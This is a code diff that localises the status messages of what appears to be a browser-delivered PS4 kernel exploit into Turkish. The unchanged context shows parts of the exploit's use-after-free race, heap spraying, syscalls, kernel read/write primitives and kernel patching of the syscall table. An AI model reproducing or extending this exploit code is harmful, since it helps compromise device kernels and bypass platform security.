@@ -135,7 +135,7 @@ let allDone = false;
             ? parseInt(params.get("spray"), 10) : 0x100;
         const { key, off } = offsetsFor(navigator.userAgent);
         mark("FW", key || "(not a PS4 UA)");
-        if (!off) { state("no offsets for this firmware", "bad"); return; }
+        if (!off) { state("Bu sistem sürümü için gerekli adresler bulunamadı", "bad"); return; }
         mark("FW-STATUS", off.fw_status || "none");
         mark("PLAN", "iov_workers=" + NUM_IOV_WORKER + " attempts=" + NUM_ATTEMPT
             + " spray=" + NUM_IOV_SPRAY
@@ -175,7 +175,7 @@ let allDone = false;
               + (payload[0] === 0xe9 ? "e9-jmp-rel32" : "NOT-e9")
             : "MISSING");
 
-        state("running the primitive...", "warn");
+        state("Bellek erişimi hazırlanıyor...", "warn");
         await new Promise(r => setTimeout(r, 0));
 
         const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;
@@ -230,7 +230,7 @@ let allDone = false;
         // collection landing here instead of on the race. If every cycle sits
         // at the floor, nothing was swept and this experiment did nothing.
         if (pairStatus.promoted && SWEEP_CYCLES > 0) {
-            state("sweeping...", "warn");
+            state("Bellek taranıyor...", "warn");
             const t0 = Date.now();
             let worst = 0;
             for (let i = 0; i < SWEEP_CYCLES; ++i) {
@@ -408,7 +408,7 @@ let allDone = false;
             const su0 = sc(SYS.setuid, 0).i32;
             if (uid0 === 0 || su0 === 0) {
                 mark("ALREADY-ROOT", "getuid=" + uid0 + " setuid(0)=" + su0);
-                state("ALREADY JAILBROKEN -- nothing to do", "ok");
+                state("İşlem zaten uygulanmış — ek işlem gerekmiyor", "ok");
                 return;
             }
         } catch (e) {}
@@ -502,7 +502,7 @@ let allDone = false;
         put(msgDv, 0x10, iovAddr);
         msgDv.setInt32(0x18, NUM_MSG_IOV, true);
 
-        state("setting up...", "warn");
+        state("Hazırlanıyor...", "warn");
         if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, argAddr).i32 === -1)
             throw new Error("socketpair failed");
         const iovSs = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
@@ -818,7 +818,7 @@ let allDone = false;
             mark("REFUSING-TO-ARM", "reason=not-rebooted-since-last-committed-run");
             check("console-rebooted-since-last-committed", false,
                 "boot=" + boot + " last=" + lastCommitted + " override=?force=1");
-            state("REBOOT FIRST -- this kernel is still poisoned", "bad");
+            state("Önce konsolu yeniden başlatın — çekirdek güvenli durumda değil", "bad");
             mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount);
             return;
         }
@@ -2165,7 +2165,7 @@ let allDone = false;
 
                     let kpatched = false;
                     if (jailbroken && kpatch && KPATCH_JMP_SITES.length >= 4) {
-                        state("kernel patches...", "warn");
+                        state("Çekirdek yamaları uygulanıyor...", "warn");
                         const SYSENT_NARG = 0, SYSENT_CALL = 8, SYSENT_THRCNT = 0x2c;
                         const sysent = kernelBase.add32(off.k_sysent_661);
                         const gadget = kernelBase.add32(off.k_jmp_rsi);
@@ -2460,7 +2460,7 @@ let allDone = false;
                 + " reached=" + (triplets ? "triplets" : committed ? "commit" : "none"));
         }
 
-        state(allDone ? "ALL DONE"
+        state(allDone ? "İşlem tamamlandı"
               : kv ? "KERNEL R/W -- REBOOT NEEDED"
               : kernelBase ? "FAILED IN make_karw -- REBOOT"
               : triplets ? "FAILED IN leak_kqueue (triple free was OK) -- REBOOT"
@@ -2468,7 +2468,7 @@ let allDone = false;
               : "no commit", allDone ? "ok" : kv ? "warn" : "bad");
     } catch (e) {
         mark("STEP10-FAILED", (e && e.message) ? e.message : String(e));
-        state("FAILED -- see log", "bad");
+        state("İşlem başarısız — ayrıntılar için işlem günlüğüne bakın", "bad");
     } finally {
 
         if (uafSock) mark("UAF-SOCK-LEFT-OPEN", "fd=" + uafSock);
